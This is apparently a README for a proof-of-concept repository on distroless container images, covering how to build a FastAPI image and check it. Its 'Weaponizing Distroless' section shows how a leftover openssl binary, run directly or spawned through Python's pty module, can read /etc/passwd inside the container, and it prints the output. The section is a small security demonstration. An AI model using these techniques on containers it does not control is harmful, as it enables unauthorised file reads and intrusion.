# Distroless image POC

A distroless container is a type of container that contains only the necessary dependencies to run a specific application, without any additional software or tools that are not required. These containers are designed to be as lightweight and secure as possible, and they aim to minimize the attack surface by removing any unnecessary components.

Distroless containers are often used in production environments where security and reliability are paramount.

Some examples of distroless containers are:

- Provided by [Google](https://github.com/GoogleContainerTools/distroless)
- Provided by [Chainguard](https://github.com/chainguard-images/images)

## Usage

The following command will generate the image `distroless/fastapi:1.0.0` and then it will execute the uvicorn webserver to expose a FastaPI endpoints, available on `localhost:5000`.

```sh
$ docker-compose up -d
```

#### Development

In order to debug everything is installed properly in the build step...

**Build an image and check the builder environment**

```sh
$ docker build -t python-builder:1.0.0 -f Dockerfile_dev_builder .
$ docker run --name test-builder python-builder:1.0.0
$ docker exec -it test-builder bash
```

**Build an image and check the final distroless container**

```sh
$ docker build -t python-distroless:1.0.0 -f Dockerfile_dev_distroless .
$ docker run --name test-distroless --entrypoint=sh -ti python-distroless:1.0.0
```

## Weaponizing Distroless

[In this post](https://www.form3.tech/engineering/content/exploiting-distroless-images) it is explained that the binary `openssl` is frequently found in these distroless containers, potentially because it's needed by the software that is going to be running inside the container.

Abusing the openssl binary is possible to execute arbitrary stuff. For example, executing openssl directly...

```sh
$ docker run --name test-distroless --entrypoint=openssl -ti distroless/fastapi:1.0.0

OpenSSL> enc -in /etc/passwd
root:x:0:0:root:/root:/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/sbin/nologin
nonroot:x:65532:65532:nonroot:/home/nonroot:/sbin/nologin

OpenSSL> exit
```

Or via python...

```sh
$ docker run --name test-distroless --entrypoint=python -ti distroless/fastapi:1.0.0
>> import pty
>> pty.spawn("/usr/bin/openssl")

OpenSSL> enc -in /etc/passwd
root:x:0:0:root:/root:/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/sbin/nologin
nonroot:x:65532:65532:nonroot:/home/nonroot:/sbin/nologin

OpenSSL> exit
```

The attack surface will be expanded depending on the installed libraries inside the container.

## References

[GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)

[chainguard-images/images](https://github.com/chainguard-images/images)

[Exploiting Distroless Images](https://www.form3.tech/engineering/content/exploiting-distroless-images)

[7 questions for distroless and small Linux distros](https://bell-sw.com/blog/distroless-containers-for-security-and-size/)
